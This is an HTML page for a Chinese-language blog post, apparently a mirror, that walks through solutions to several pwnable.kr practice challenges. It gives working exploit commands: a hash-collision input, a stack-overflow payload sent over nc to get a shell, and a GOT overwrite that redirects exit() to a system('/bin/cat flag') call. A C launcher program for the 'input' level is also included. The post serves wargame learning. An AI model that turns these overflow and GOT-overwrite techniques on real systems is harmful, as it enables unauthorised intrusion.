@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"kerisa.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Toddler’s Bottlecol1.&#x2F;col &quot;$(python -c &#x27;from struct import pack;print &quot;0&quot;\*16 + pack(&quot;&lt;I&quot;, 0x611c492c)&#x27;)&quot;  bof一开始不熟悉输入处理，花了不少时间……echo 后面追加 cat 可以使输入流关闭，成功获得">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr 练习（一）">
+<meta property="og:url" content="https://kerisa.github.io/1640/index.html">
+<meta property="og:site_name" content="Re: Memory (mirror)">
+<meta property="og:description" content="Toddler’s Bottlecol1.&#x2F;col &quot;$(python -c &#x27;from struct import pack;print &quot;0&quot;\*16 + pack(&quot;&lt;I&quot;, 0x611c492c)&#x27;)&quot;  bof一开始不熟悉输入处理，花了不少时间……echo 后面追加 cat 可以使输入流关闭，成功获得">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-08-08T14:00:30.000Z">
+<meta property="article:modified_time" content="2025-07-21T18:42:00.529Z">
+<meta property="article:author" content="flandre">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="pwnable.kr">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://flandre-scarlet.moe/blog/1640/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwnable.kr 练习（一） | Re: Memory (mirror)</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Re: Memory (mirror)</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://kerisa.github.io/1640/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/sys-imgs/42553027_1.png">
+      <meta itemprop="name" content="flandre">
+      <meta itemprop="description" content="This is a mirror/backup site of flandre-scarlet.moe. It serves as a fallback when the original site is inaccessible.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Re: Memory (mirror)">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwnable.kr 练习（一）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-08 22:00:30" itemprop="dateCreated datePublished" datetime="2021-08-08T22:00:30+08:00">2021-08-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-07-22 02:42:00" itemprop="dateModified" datetime="2025-07-22T02:42:00+08:00">2025-07-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A8%8B%E5%BA%8F/" itemprop="url" rel="index"><span itemprop="name">程序</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Toddler’s-Bottle"><a href="#Toddler’s-Bottle" class="headerlink" title="Toddler’s Bottle"></a>Toddler’s Bottle</h1><h2 id="col"><a href="#col" class="headerlink" title="col"></a>col</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col <span class="string">&quot;<span class="subst">$(python -c &#x27;from struct import pack;print <span class="string">&quot;0&quot;</span>\*16 + pack(<span class="string">&quot;&lt;I&quot;</span>, 0x611c492c)</span>&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p>一开始不熟悉输入处理，花了不少时间……echo 后面追加 cat 可以使输入流关闭，成功获得 shell。（PS：一开始拿到了 shell 还不自知……）不加 cat 的话则会提示 <em>*** stack smashing detected ***: terminated</em> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(python -c &#x27;from struct import pack;print <span class="string">&quot;A&quot;</span>\*52 + pack(<span class="string">&quot;&lt;I&quot;</span>, 0xcafebabe)</span>&#x27;)&quot;</span>;<span class="built_in">cat</span>) nc pwnable.kr 9000</span><br></pre></td></tr></table></figure></p>
+<span id="more"></span>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>拖到 ida 里，一开始觉得函数很少，而且找不到 pe 里的字符串，翻来翻去发现原来用 upx 压缩了。解压后就简单了，从 main 函数里直接就能看到引用的 flag 字符串内容。</p>
+<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>观察代码可以看到，<code>scanf</code>、<code>passcode1</code> 和 <code>passcode2</code> 的地方都没有加取地址符，则数据不会写到这两个变量而是写道它们的值所指向的地址上。但 <code>passcode1</code>，<code>passcode2</code> 都没有初始化，所以它们的值是随机的——本该如此，但是在调用 <code>login</code> 之前会先调用 <code>welcome</code> 函数，<code>welcome</code> 中的 <code>char name[100]</code> 使得我们可以控制 p1 和 p2 变量的值。因为 <code>welcome</code> 和 <code>login</code> 的 ebp 是相等的，当栈重用时 p1 p2 占据的位置正好落在 <code>name[100]</code> 的范围内。而我们可以输入几乎任意的值到 <code>name</code> 里（除了 \x0 空白字符等，scanf(%s) 的限制）。 这样就能想到先把 p1 p2 的值初始化成它们的地址，然后再填入 if 中的两个整数满足条件，但实际上每次运行时栈的位置无法预知，所以不好做到。 从另一个角度看也可以利用任意 4 字节地址写入的能力直接绕过这个 if，比如直接跳到 <code>system(&quot;/bin/cat flag&quot;);</code> 开始执行。可以通过改写 GOT 表来达到偷梁换柱的目的，这样程序在试图调用被篡改过函数时就会跳转到我们想要的位置。而可以选择的目标就是 <code>scanf(&quot;%d&quot;, passcode1);</code> 之后可以被调用到的函数。 查看 <code>passcode</code> 的 GOT 表，因为 <code>printf</code> <code>scanf</code> 的地址里有 \x0 \x20 所以排除掉，剩下可以选 <code>fflush</code> 和 <code>exit</code>。比如 <code>exit</code> 的地址是 0x0804a018。</p>
+<p>Relocation section ‘.rel.plt’ at offset 0x398 contains 9 entries:<br> Offset     Info    Type            Sym.Value  Sym. Name<br>0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0<br>0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0<br>0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4<br>0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0<br>0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0<br>0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__<br>0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0<br>0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0<br>0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</p>
+<p>反汇编 elf 可以找到想要执行的 <code>system(&quot;/bin/cat flag&quot;);</code> 地址是 0x80485e3。 所以做法就是先把 <code>passcode1</code> 的值初始化成 0x0804a018，然后执行到 <code>scanf p1</code> 时输入 0x80485e3。然后代码执行到 <code>exit(0)</code> 时就会跳转了。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print &quot;A&quot;\*96 + &quot;\\x18\\xa0\\x04\\x08 134514147&quot;&#x27;</span> &gt; /tmp/test ./passcode &lt; /tmp/test</span><br></pre></td></tr></table></figure></p>
+<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>关键在于 <em>If no seed value is provided, the rand() function is automatically seeded with a value of 1.</em> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入 3039230856</span><br></pre></td></tr></table></figure></p>
+<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>主要要熟悉 libc 函数……另外远程机上的环境也有所不同，要稍作调整。把代码拷到 &#x2F;tmp 的单独目录下，并将 flag 链接到当前目录，因为当前目录是 input 的工作目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /tmp/ABC &amp;&amp; <span class="built_in">cd</span> /tmp/ABC <span class="built_in">ln</span> -s /home/input2/flag flag <span class="built_in">cat</span> &gt; 1.c ; 输入源代码，PATH\_INPUT 切换成 input 文件实际所在路径 gcc 1.c -o 1 &amp;&amp; ./1</span><br></pre></td></tr></table></figure> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span> #<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH\_IN <span class="string">&quot;st2-in&quot;</span> #<span class="keyword">define</span> PATH\_ERR <span class="string">&quot;st2-err&quot;</span> #<span class="keyword">define</span> PATH\_OUT <span class="string">&quot;st2-out&quot;</span> #<span class="keyword">define</span> PATH\_0A <span class="string">&quot;\\x0a&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0 #<span class="keyword">define</span> PATH\_INPUT <span class="string">&quot;input&quot;</span> #<span class="keyword">else</span> #<span class="keyword">define</span> PATH\_INPUT <span class="string">&quot;/home/input2/input&quot;</span> #<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; <span class="type">char</span>\* n\_argv\[<span class="number">101</span>\] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1 for (int i = 0; i &lt; 100; ++i) &#123; n\_argv\[i\] = &quot;&quot;; &#125; n\_argv\[100\] = NULL; n\_argv\[&#x27;A&#x27;\] = &quot;\\x00&quot;; n\_argv\[&#x27;B&#x27;\] = &quot;\\x20\\x0a\\x0d&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2 int n\_in = open(PATH\_IN, O\_CREATO\_TRUNCO\_RDWR, S\_IRWXUS\_IRWXOS\_IRWXG); int n\_err = open(PATH\_ERR, O\_CREATO\_TRUNCO\_RDWR, S\_IRWXUS\_IRWXOS\_IRWXG); write(n\_in, &quot;\\x00\\x0a\\x00\\xff&quot;, 4); write(n\_err, &quot;\\x00\\x0a\\x02\\xff&quot;, 4); lseek(n\_in, 0, SEEK\_SET); lseek(n\_err, 0, SEEK\_SET); dup2(n\_in, STDIN\_FILENO); dup2(n\_err, STDERR\_FILENO);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3 char\* n\_env\[3\] = &#123;0&#125;; n\_env\[0\] = &quot;\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe&quot;; n\_env\[1\] = NULL;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4 int fa = open(PATH\_0A, O\_CREATO\_TRUNCO\_RDWR, S\_IRWXUS\_IRWXOS\_IRWXG); write(fa, &quot;\\x00\\x00\\x00\\x00&quot;, 4); close(fa);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1 n\_argv\[&#x27;C&#x27;\] = &quot;10000&quot;; int pid = -1; if ((pid = fork()) == 0) &#123; execve(PATH\_INPUT, n\_argv, n\_env); printf(&quot;exec err: %d\\n&quot;, errno); &#125; else if (pid &gt; 0) &#123; // 5.2 sleep(1); int sk = socket(AF\_INET, SOCK\_STREAM, 0); struct sockaddr\_in target; target.sin\_family = AF\_INET; target.sin\_addr.s\_addr = inet\_addr(&quot;127.0.0.1&quot;); target.sin\_port = htons(10000); if (connect(sk, (struct sockaddr\*)&amp;target, sizeof(target)) &lt; 0) printf(&quot;connect err: %d\\n&quot;, errno); send(sk, &quot;\\xde\\xad\\xbe\\xef&quot;, 4, 0); close(sk); &#125; else &#123; puts(&quot;fork failed&quot;); &#125; return 0; &#125;</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>flandre
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://kerisa.github.io/1640/" title="pwnable.kr 练习（一）">https://kerisa.github.io/1640/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/1603/" rel="prev" title="樱之杜†净梦者——一圆三吃">
+      <i class="fa fa-chevron-left"></i> 樱之杜†净梦者——一圆三吃
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/1658/" rel="next" title="pwnable.kr 练习（二）">
+      pwnable.kr 练习（二） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Toddler%E2%80%99s-Bottle"><span class="nav-number">1.</span> <span class="nav-text">Toddler’s Bottle</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#col"><span class="nav-number">1.1.</span> <span class="nav-text">col</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bof"><span class="nav-number">1.2.</span> <span class="nav-text">bof</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag"><span class="nav-number">1.3.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#passcode"><span class="nav-number">1.4.</span> <span class="nav-text">passcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#random"><span class="nav-number">1.5.</span> <span class="nav-text">random</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input"><span class="nav-number">1.6.</span> <span class="nav-text">input</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt=""
+      src="/sys-imgs/42553027_1.png">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description">This is a mirror/backup site of flandre-scarlet.moe. It serves as a fallback when the original site is inaccessible.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">102</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">247</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flandre</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">328k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:58</span>
+</div>
+  <div class="powered-by">Powered by love
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
